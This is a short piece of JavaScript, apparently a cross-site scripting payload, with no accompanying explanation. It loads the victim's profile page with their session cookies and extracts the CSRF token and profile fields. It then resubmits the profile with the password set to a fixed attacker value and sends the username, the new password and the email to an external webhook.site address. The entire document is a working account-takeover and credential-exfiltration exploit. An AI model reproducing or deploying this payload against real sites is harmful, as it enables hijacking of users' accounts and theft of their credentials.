fetch('/profile',{credentials:'include'}).then(r=>r.text()).then(h=>{
  let d=new DOMParser().parseFromString(h,'text/html');
  let t=d.querySelector('[name="csrf_token"]')?.value;
  if(!t)return;
  let u=d.querySelector('[name="username"]')?.value||'';
  let f=d.querySelector('[name="firstname"]')?.value||'';
  let l=d.querySelector('[name="lastname"]')?.value||'';
  let e=d.querySelector('[name="email"]')?.value||'';
  
  const p='Pwn3d2026!!';
  
  let b=new URLSearchParams();
  b.append('csrf_token',t);
  b.append('username',u);
  b.append('firstname',f);
  b.append('lastname',l);
  b.append('email',e);
  b.append('password',p);
  b.append('passwordCheck',p);
  b.append('submit','Submit');

  fetch('https://webhook.site/557a412f-f375-41c9-b27f-a1ec11ea0df5?test=script-ran')
  .catch(()=>{});

  
  fetch('/profile',{method:'POST',credentials:'include',body:b}).then(()=>{
    fetch('https://webhook.site/557a412f-f375-41c9-b27f-a1ec11ea0df5?username='+encodeURIComponent(u)+'&pass='+encodeURIComponent(p)+'&email='+encodeURIComponent(e),{mode:'no-cors'});
  });
})
